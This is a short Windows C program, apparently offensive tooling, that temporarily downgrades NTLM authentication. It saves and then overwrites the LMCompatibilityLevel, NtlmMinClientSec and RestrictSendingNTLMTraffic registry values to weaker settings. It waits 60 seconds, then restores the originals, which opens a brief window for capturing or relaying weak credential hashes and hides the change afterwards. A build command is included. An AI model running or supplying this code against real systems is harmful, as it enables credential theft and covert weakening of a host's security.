#include <stdio.h>
#include <windows.h>
#include <winreg.h>
#include <stdint.h>
#include <unistd.h>

// function to get the value of a registry key
void GetRegKey(const char* path, const char* key, DWORD* oldValue) {
    HKEY hKey;
    DWORD value;
    DWORD valueSize = sizeof(DWORD);

    // open the registry key for reading
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueEx(hKey, key, NULL, NULL, (LPBYTE)&value, &valueSize);
        RegCloseKey(hKey);
        *oldValue = value;
    } else {
        printf("Error reading registry key.\n");
    }
}

// function to set the value of a registry key
void SetRegKey(const char* path, const char* key, DWORD newValue) {
    HKEY hKey;

    // open the registry key for writing
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        // set the new value for the specified key
        RegSetValueEx(hKey, key, 0, REG_DWORD, (const BYTE*)&newValue, sizeof(DWORD));
        // close the registry key
        RegCloseKey(hKey);
    } else {
        printf("Error writing registry key.\n");
    }
}

// function to temporarily downgrade NTLM settings
void ExtendedNTLMDowngrade(DWORD* oldValue_LMCompatibilityLevel, DWORD* oldValue_NtlmMinClientSec, DWORD* oldValue_RestrictSendingNTLMTraffic) {
    // retrieve and store the current values of NTLM-related registry keys
    GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
    GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", oldValue_NtlmMinClientSec);
    GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);

    // set new values for the NTLM-related registry keys
    SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2); // lower security level
    SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 536870912); // specific client security level
    SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0); // disable restrictions
}

// function to restore original NTLM settings
void NTLMRestore(DWORD oldValue_LMCompatibilityLevel, DWORD oldValue_NtlmMinClientSec, DWORD oldValue_RestrictSendingNTLMTraffic) {
    // restore the original values of NTLM-related registry keys
    SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
    SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", oldValue_NtlmMinClientSec);
    SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
}

// main function
int main() {
    DWORD oldValue_LMCompatibilityLevel = 0;
    DWORD oldValue_NtlmMinClientSec = 0;
    DWORD oldValue_RestrictSendingNTLMTraffic = 0;

    // downgrade NTLM settings and store original values
    ExtendedNTLMDowngrade(&oldValue_LMCompatibilityLevel, &oldValue_NtlmMinClientSec, &oldValue_RestrictSendingNTLMTraffic);

    // pause execution for 60 seconds
    sleep(60);

    // restore original NTLM settings
    NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);

    return 0;
}

// $ x86_64-w64-mingw32-gcc -o ntlm_downgrade.exe ntlm_downgrade.c